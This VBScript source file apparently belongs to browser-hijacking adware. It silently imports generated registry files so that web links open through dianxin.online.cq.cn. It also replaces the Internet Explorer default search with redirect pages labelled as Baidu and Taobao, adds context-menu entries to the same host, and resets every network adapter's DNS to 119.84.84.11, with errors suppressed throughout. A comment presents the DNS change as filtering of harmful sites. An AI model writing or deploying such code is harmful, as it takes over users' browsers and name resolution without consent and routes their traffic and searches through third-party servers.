    f.WriteLine """{0E5CBF21-D15F-11D0-8301-00AA005B4383}""=hex:21,bf,5c,0e,5f,d1,d0,11,83,01,00,\"
    f.WriteLine "  aa,00,5b,43,83,22,00,1c,00,08,00,00,00,06,00,00,00,01,00,00,00,00,00,00,00,\"
    f.WriteLine "  00,00,00,00,00,00,00,00,4c,00,00,00,01,14,02,00,00,00,00,00,c0,00,00,00,00,\"
    f.WriteLine "  00,00,46,81,00,00,00,10,00,00,00,fe,b8,49,65,27,bb,c9,01,12,c0,b1,6e,27,bb,\"
    f.WriteLine "  c9,01,5a,ac,06,68,27,bb,c9,01,00,00,00,00,00,00,00,00,01,00,00,00,00,00,00,\"
    f.WriteLine "  00,00,00,00,00,00,00,00,00,5b,01,14,00,1f,50,e0,4f,d0,20,ea,3a,69,10,a2,d8,\"
    f.WriteLine "  08,00,2b,30,30,9d,19,00,2f,43,3a,5c,00,00,00,00,00,00,00,00,00,00,00,00,00,\"
    f.WriteLine "  00,00,00,00,00,00,5c,00,31,00,00,00,00,00,8c,3a,cb,23,10,00,44,4f,43,55,4d,\"
    f.WriteLine "  45,7e,31,00,00,44,00,03,00,04,00,ef,be,8c,3a,da,21,8c,3a,cb,23,14,00,00,00,\"
    f.WriteLine "  44,00,6f,00,63,00,75,00,6d,00,65,00,6e,00,74,00,73,00,20,00,61,00,6e,00,64,\"
    f.WriteLine "  00,20,00,53,00,65,00,74,00,74,00,69,00,6e,00,67,00,73,00,00,00,18,00,4a,00,\"
    f.WriteLine "  31,00,00,00,00,00,8c,3a,cc,23,10,00,41,44,4d,49,4e,49,7e,31,00,00,32,00,03,\"
    f.WriteLine "  00,04,00,ef,be,8c,3a,cb,23,8c,3a,cc,23,14,00,00,00,41,00,64,00,6d,00,69,00,\"
    f.WriteLine "  6e,00,69,00,73,00,74,00,72,00,61,00,74,00,6f,00,72,00,00,00,18,00,56,00,31,\"
    f.WriteLine "  00,00,00,00,00,8c,3a,ce,23,11,00,46,41,56,4f,52,49,7e,31,00,00,3e,00,03,00,\"
    f.WriteLine "  04,00,ef,be,8c,3a,cb,23,8c,3a,ce,23,14,00,28,00,46,00,61,00,76,00,6f,00,72,\"
    f.WriteLine "  00,69,00,74,00,65,00,73,00,00,00,40,73,68,65,6c,6c,33,32,2e,64,6c,6c,2c,2d,\"
    f.WriteLine "  31,32,36,39,33,00,18,00,30,00,35,00,00,00,00,00,8c,3a,cf,23,10,00,fe,94,a5,\"
    f.WriteLine "  63,00,00,1c,00,03,00,04,00,ef,be,8c,3a,cc,23,8c,3a,cf,23,14,00,00,00,fe,94,\"
    f.WriteLine "  a5,63,00,00,14,00,00,00,60,00,00,00,03,00,00,a0,58,00,00,00,00,00,00,00,67,\"
    f.WriteLine "  68,6f,73,74,78,70,33,2d,34,36,37,36,38,30,00,08,ff,f6,b7,27,38,41,4d,8d,f3,\"
    f.WriteLine "  17,a7,2f,9d,10,1c,dd,0c,5a,86,1a,27,de,11,b2,8a,86,62,af,bb,9f,a2,08,ff,f6,\"
    f.WriteLine "  b7,27,38,41,4d,8d,f3,17,a7,2f,9d,10,1c,dd,0c,5a,86,1a,27,de,11,b2,8a,86,62,\"
    f.WriteLine "  af,bb,9f,a2,00,00,00,00"
    f.WriteLine """ITBarLayout""=hex:11,00,00,00,5c,00,00,00,00,00,00,00,34,00,00,00,1f,00,00,00,\"
    f.WriteLine "  56,00,00,00,01,00,00,00,20,07,00,00,a0,0f,00,00,05,00,00,00,62,05,00,00,26,\"
    f.WriteLine "  00,00,00,02,00,00,00,21,07,00,00,a0,0f,00,00,04,00,00,00,21,01,00,00,a0,0f,\"
    f.WriteLine "  00,00,03,00,00,00,20,03,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,\"
    f.WriteLine "  00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,\"
    f.WriteLine "  00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,\"
    f.WriteLine "  00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,\"
    f.WriteLine "  00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,\"
    f.WriteLine "  00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,\"
    f.WriteLine "  00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,\"
    f.WriteLine "  00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,\"
    f.WriteLine "  00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,\"
    f.WriteLine "  00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,\"
    f.WriteLine "  00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,\"
    f.WriteLine "  00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,\"
    f.WriteLine "  00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,\"
    f.WriteLine "  00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,\"
    f.WriteLine "  00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,\"
    f.WriteLine "  00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,\"
    f.WriteLine "  00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,\"
    f.WriteLine "  00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,\"
    f.WriteLine "  00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,\"
    f.WriteLine "  00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00"
    f.WriteLine """ITBar7Layout""=hex:13,00,00,00,00,00,00,00,00,00,00,00,30,00,00,00,14,00,00,00,\"
    f.WriteLine "  2a,00,00,00,01,00,00,00,80,06,00,00,80,01,00,00,03,00,00,00,81,02,00,00,00,\"
    f.WriteLine "  00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,\"
    f.WriteLine "  00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,\"
    f.WriteLine "  00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,\"
    f.WriteLine "  00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,\"
    f.WriteLine "  00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,\"
    f.WriteLine "  00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,\"
    f.WriteLine "  00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,\"
    f.WriteLine "  00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,\"
    f.WriteLine "  00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,\"
    f.WriteLine "  00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,\"
    f.WriteLine "  00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,\"
    f.WriteLine "  00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,\"
    f.WriteLine "  00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,\"
    f.WriteLine "  00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,\"
    f.WriteLine "  00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,\"
    f.WriteLine "  00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,\"
    f.WriteLine "  00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,\"
    f.WriteLine "  00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,\"
    f.WriteLine "  00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,\"
    f.WriteLine "  00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,\"
    f.WriteLine "  00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00"
    f.WriteLine """{B580CF65-E151-49C3-B73F-70B13FCA8E86}""=hex:65,cf,80,b5,51,e1,c3,49,b7,3f,70,\"
    f.WriteLine "  b1,3f,ca,8e,86"
    f.WriteLine """{F2CF5485-4E02-4F68-819C-B92DE9277049}""=hex:85,54,cf,f2,02,4e,68,4f,81,9c,b9,\"
    f.WriteLine "  2d,e9,27,70,49,22,00,1c,00,08,00,00,00,06,00,00,00,01,00,00,00,00,00,00,00,\"
    f.WriteLine "  00,00,00,00,00,00,00,00,4c,00,00,00,01,14,02,00,00,00,00,00,c0,00,00,00,00,\"
    f.WriteLine "  00,00,46,81,00,00,00,10,00,00,00,10,a1,55,c0,ff,e9,ca,01,18,bf,0f,fd,11,ed,\"
    f.WriteLine "  ca,01,18,bf,0f,fd,11,ed,ca,01,00,00,00,00,00,00,00,00,01,00,00,00,00,00,00,\"
    f.WriteLine "  00,00,00,00,00,00,00,00,00,5b,01,14,00,1f,50,e0,4f,d0,20,ea,3a,69,10,a2,d8,\"
    f.WriteLine "  08,00,2b,30,30,9d,19,00,2f,43,3a,5c,00,00,00,00,00,00,00,00,00,00,00,00,00,\"
    f.WriteLine "  00,00,00,00,00,00,5c,00,31,00,00,00,00,00,8e,3a,b9,15,10,00,44,4f,43,55,4d,\"
    f.WriteLine "  45,7e,31,00,00,44,00,03,00,04,00,ef,be,8c,3a,da,21,a2,3c,2c,70,14,00,00,00,\"
    f.WriteLine "  44,00,6f,00,63,00,75,00,6d,00,65,00,6e,00,74,00,73,00,20,00,61,00,6e,00,64,\"
    f.WriteLine "  00,20,00,53,00,65,00,74,00,74,00,69,00,6e,00,67,00,73,00,00,00,18,00,4a,00,\"
    f.WriteLine "  31,00,00,00,00,00,a5,3c,05,86,10,00,41,44,4d,49,4e,49,7e,31,00,00,32,00,03,\"
    f.WriteLine "  00,04,00,ef,be,8c,3a,cb,23,a5,3c,05,86,14,00,00,00,41,00,64,00,6d,00,69,00,\"
    f.WriteLine "  6e,00,69,00,73,00,74,00,72,00,61,00,74,00,6f,00,72,00,00,00,18,00,56,00,31,\"
    f.WriteLine "  00,00,00,00,00,a2,3c,80,96,11,00,46,41,56,4f,52,49,7e,31,00,00,3e,00,03,00,\"
    f.WriteLine "  04,00,ef,be,a2,3c,00,70,a2,3c,80,96,14,00,28,00,46,00,61,00,76,00,6f,00,72,\"
    f.WriteLine "  00,69,00,74,00,65,00,73,00,00,00,40,73,68,65,6c,6c,33,32,2e,64,6c,6c,2c,2d,\"
    f.WriteLine "  31,32,36,39,33,00,18,00,30,00,35,00,00,00,00,00,a6,3c,e4,5d,10,00,fe,94,a5,\"
    f.WriteLine "  63,00,00,1c,00,03,00,04,00,ef,be,a2,3c,00,70,a6,3c,e4,5d,14,00,00,00,fe,94,\"
    f.WriteLine "  a5,63,00,00,14,00,00,00,60,00,00,00,03,00,00,a0,58,00,00,00,00,00,00,00,70,\"
    f.WriteLine "  63,32,30,31,30,30,35,30,32,32,31,76,63,62,00,08,ff,f6,b7,27,38,41,4d,8d,f3,\"
    f.WriteLine "  17,a7,2f,9d,10,1c,92,a9,ac,9d,ce,58,df,11,a8,ce,00,1e,65,ca,82,46,08,ff,f6,\"
    f.WriteLine "  b7,27,38,41,4d,8d,f3,17,a7,2f,9d,10,1c,92,a9,ac,9d,ce,58,df,11,a8,ce,00,1e,\"
    f.WriteLine "  65,ca,82,46,00,00,00,00"
    
    
    
	Set fso  = Nothing
	Set WshShell= CreateObject("WScript.Shell") 
	WshShell.Run "regedit /s " & regPathSix
	WshShell.Run "regedit /s " & regPathSeven
    Set WshShell  = Nothing
End Function


'设置链接打开地址
Public Sub SetRegDefaultOpenUrl()   
On Error Resume Next
    dim url
    url="http://dianxin.online.cq.cn/api/http/index.htm?"
    dim ie_temp_path
    ie_temp_path=GetWebBrowserPath() '获取一个浏览器路径    
    Set fso = CreateObject("Scripting.FileSystemObject")    
    If not fso.FileExists(ie_temp_path) Then  '不存在则读取默认
      ie_temp_path=iePath
    End If
    Set fso  = Nothing
    
    
    Const HKEY_CLASSES_ROOT = &H80000000
      
    strComputer = "."
    Set StdOut = WScript.StdOut   
    Set oReg=GetObject("winmgmts:{impersonationLevel=impersonate}!\\" & strComputer & "\root\default:StdRegProv")   
    
    strKeyPath = "HTTP\shell\360SE.exe\command"
    strValueName = ""
    
    oReg.GetExpandedStringValue HKEY_CLASSES_ROOT,strKeyPath,_   
    strValueName,strValue
    
    if strValue<>"" or instr(strValue,url)=0 then
        '写入值到节点
        strValueName = ""  
        strValue = """" & ie_temp_path & """" & " " & url & " " & "%1"
        oReg.SetExpandedStringValue HKEY_CLASSES_ROOT,strKeyPath,strValueName,strValue  
    end if 
    
    strKeyPath = "HTTP\shell\open\command"  
    strValueName = ""  
    oReg.GetExpandedStringValue HKEY_CLASSES_ROOT,strKeyPath,_   
    strValueName,strValue
    
    if strValue<>"" or instr(strValue,url)=0 then
        '写入值到节点
        strValueName = ""  
        strValue = """" & ie_temp_path & """" & " " & url & " " & "%1"
        oReg.SetExpandedStringValue HKEY_CLASSES_ROOT,strKeyPath,strValueName,strValue  
    end if 
    
    strKeyPath = "HTTP\shell\Maxthon2\command"
    strValueName = ""
    
    oReg.GetExpandedStringValue HKEY_CLASSES_ROOT,strKeyPath,_   
    strValueName,strValue
    
    if strValue<>"" or instr(strValue,url)=0 then
        '写入值到节点
        strValueName = ""  
        strValue = """" & ie_temp_path & """" & " " & url & " " & "%1"
        oReg.SetExpandedStringValue HKEY_CLASSES_ROOT,strKeyPath,strValueName,strValue  
    end if 
    
    strKeyPath = "HTTP\shell\SogouExplorer\command"
    strValueName = ""
    
    oReg.GetExpandedStringValue HKEY_CLASSES_ROOT,strKeyPath,_   
    strValueName,strValue
    
    if strValue<>"" or instr(strValue,url)=0 then
        '写入值到节点
        strValueName = ""  
        strValue = """" & ie_temp_path & """" & " " & url & " " & "%1"
        oReg.SetExpandedStringValue HKEY_CLASSES_ROOT,strKeyPath,strValueName,strValue  
    end if 
    
End Sub







'增加IE默认搜索,成功返回1,失败或错误返回0
Public Function IeSearch()   
    url="http://www.mylovewebs.com"
    Set ws = CreateObject("WScript.Shell") 
    Set Environ = ws.Environment("process") 
    regPath = Environ("windir") & "\search.reg"
    Set fso = CreateObject("Scripting.FileSystemObject")
    Set f1=fso.CreateTextFile(regPath, True)
	f1.WriteLine "Windows Registry Editor Version 5.00"
    f1.WriteLine "[HKEY_CURRENT_USER\Software\Microsoft\Internet Explorer\SearchScopes]"
    f1.WriteLine """DefaultScope""=""{B2D17A31-2642-4D03-9D1F-ABD3BE1DCC4E}"""
    
    f1.WriteLine "[HKEY_CURRENT_USER\Software\Microsoft\Internet Explorer\SearchScopes\{B2D17A31-2642-4D03-9D1F-ABD3BE1DCC4E}]"
    f1.WriteLine """DisplayName""=""百度一下，你就知道"""
    f1.WriteLine """URL""=""" & url & "/api/baidu/so.htm?word={searchTerms}"""
    f1.WriteLine """FaviconPath""=""C:\\Documents and Settings\\Administrator\\Local Settings\\Application Data\\Microsoft\\Internet Explorer\\Services\\search_{B2D17A31-2642-4D03-9D1F-ABD3BE1DCC4E}.ico"""
    f1.WriteLine """SortIndex""=dword:00000002"
    
    f1.WriteLine "[HKEY_CURRENT_USER\Software\Microsoft\Internet Explorer\SearchScopes\{E140FB5B-2A9D-4FA4-A20F-089B92412200}]"
    f1.WriteLine """DisplayName""=""淘宝搜索"""
    f1.WriteLine """URL""=""" & url & "/api/taobao/so.htm?word={searchTerms}"""
    f1.WriteLine """FaviconURL""=""http://www.taobao.com/favicon.ico"""
    f1.WriteLine """FaviconPath""=""C:\\Documents and Settings\\Administrator\\Local Settings\\Application Data\\Microsoft\\Internet Explorer\\Services\\search_{E140FB5B-2A9D-4FA4-A20F-089B92412200}.ico"""
    f1.WriteLine """SortIndex""=dword:00000006"
    
    Set fso = Nothing
	Set WshShell= CreateObject("WScript.Shell") 
	WshShell.Run "regedit /s " & regPath
    Set WshShell  = Nothing    
End Function



'增加IE右键菜单
Public Function AddRight()   
On Error Resume Next
    Set ws = CreateObject("WScript.Shell") 
    Set Environ = ws.Environment("process")   
    Dim regPathSeven
    regPathSeven = Environ("windir") & "\AddRight.reg"
    Set fso = CreateObject("Scripting.FileSystemObject")
    Set f=fso.CreateTextFile(regPathSeven, True)
    f.WriteLine "Windows Registry Editor Version 5.00"
    f.WriteLine "[HKEY_CURRENT_USER\Software\Microsoft\Internet Explorer\MenuExt\使用[综合]选词快速搜索]"
    f.WriteLine "@=""http://dianxin.online.cq.cn/api/tag/index.htm"""
    
    f.WriteLine "[HKEY_CURRENT_USER\Software\Microsoft\Internet Explorer\MenuExt\使用[百度]选词快速搜索]"
    f.WriteLine "@=""http://dianxin.online.cq.cn/api/tag/baidu.htm"""
    
    f.WriteLine "[HKEY_CURRENT_USER\Software\Microsoft\Internet Explorer\MenuExt\使用[谷歌]选词快速搜索]"
    f.WriteLine "@=""http://dianxin.online.cq.cn/api/tag/google.htm"""
    
    f.WriteLine "[HKEY_CURRENT_USER\Software\Microsoft\Internet Explorer\MenuExt\使用[有道]选词快速搜索]"
    f.WriteLine "@=""http://dianxin.online.cq.cn/api/tag/youdao.htm"""

	Set fso  = Nothing
	Set WshShell= CreateObject("WScript.Shell") 
	WshShell.Run "regedit /s " & regPathSeven
    Set WshShell  = Nothing
End Function


'设置用户电脑DNS的IP(过滤黄色网站和木马网站、恶意网站)
Public Function SetFilterDns()   
On Error Resume Next
     dim str
     str=GetWindowsVersion
     if str="windows visita" or str="i don't know" then
        Exit Function
     end if
    
     Set objWMIService=GetObject("winmgmts:\\.\root\cimv2")
     Set colNetAdapters=objWMIService.ExecQuery("Select * from Win32_NetworkAdapterConfiguration where IPEnabled=TRUE")
     arrDNS=Array("119.84.84.11","8.8.8.8")
     For Each objNetAdapter in colNetAdapters
         If Isarray(arrDNS) Then objNetAdapter.SetDNSServerSearchOrder arrDNS
     Next
End Function 

Public Function GetWindowsVersion()
On Error Resume Next
    dim str
    strComputer = "."

    Set objWMIService = GetObject("winmgmts:\\" & strComputer & "\root\cimv2")
    Set colItems = objWMIService.ExecQuery("Select * from Win32_OperatingSystem")

    For Each objItem in colItems
        strOSVersion = objItem.Version
    Next
    
    select case strOSversion
    case "5.2.3790"
        str="windows Server 2003"
    case "5.0.2195"
         str="windows 2000"
    case "5.1.2600"
        str="windows XP"
    case "6.0.6001"
        str="windows visita"
    case else
        str="i don't know"
    end select
    GetWindowsVersion=str
    Exit Function
End Function 
'by 






